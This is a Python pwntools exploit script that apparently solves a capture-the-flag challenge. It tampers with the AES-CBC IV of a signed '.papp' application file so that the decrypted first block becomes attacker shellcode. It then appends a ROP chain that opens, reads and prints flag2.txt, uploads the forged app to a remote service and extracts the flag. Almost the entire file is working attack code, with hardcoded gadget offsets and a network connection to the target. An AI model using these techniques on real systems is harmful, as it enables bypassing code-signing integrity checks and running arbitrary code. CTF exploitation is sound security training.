#!/usr/local/bin/python
from pwn import *
import hashlib, sys, re
context.arch = 'amd64'

class Page(object):
    def __init__(self, base, prot, raw='', key=0xff):
        assert len(raw) <= 0x1000
        self.base = base
        self.raw = raw
        self.prot = prot
        self.key = key

    def __str__(self):
        data = self.raw
        prot = self.prot
        return struct.pack('<IIBBBB', self.base, len(self.raw), prot, 1,
                self.key, self.key) + data


# assume we already have signed flag1.papp

# step 1: hack aes-cbc iv
blob = bytearray(open('flag1.papp').read())
iv = blob[0x154:0x164]
print str(iv).encode('hex')
first_block = bytearray('4883EC0848BF0000000001000000BE00'.decode('hex'))
our_shellcode = bytearray(asm('''
    // 1: jmp 1b
    add rsp, 0xd0;
    ret;
'''))
assert len(our_shellcode) <= len(first_block)
for i in xrange(len(our_shellcode)):
    blob[0x154 + i] = iv[i] ^ first_block[i] ^ our_shellcode[i]

# step 2: ROP open/read/write flag
blob[4] += 1

def build_papp(rop):
    raw = blob + str(Page(0xf0000000, 3, rop))
    with open('exp2.papp', 'w') as f:
        f.write(str(raw))
    return raw

loader_base = 0x10000000
Xopen = loader_base + 0x410
Xecho = loader_base + 0x290
_read = loader_base + 0x80
_exit = loader_base + 0x30
ret = loader_base + 0x37
pop_rdi = loader_base + 0x1b0
pop_rsi_r15 = loader_base + 0x91d

build_papp('flag2.txt'.ljust(0x10, '\x00')
    + ''.join(map(p64, [
        ret, ret, ret, ret, ret, ret, ret, ret,
        pop_rdi, 0xf0000000,
        Xopen,
        pop_rdi, 3,
        pop_rsi_r15, 0xf0000800, 0x123,
        _read,
        pop_rdi, 0xf0000800,
        Xecho,
        _exit
    ])))

r = remote(sys.argv[1], int(sys.argv[2]))

def download(app):
    with open(app) as f:
        blob = f.read()
        r.sendline('download %s %d' % (app, len(blob)))
        r.send(blob)

download('exp2.papp')
r.sendline('run exp2.papp')
d = r.recvuntil('flag1 exit 0x1')
print d
flags = re.findall(r'OOO{.*}', d) # it appears multiple times
print flags
print 'FLAG:', flags[0]
sys.exit(0)
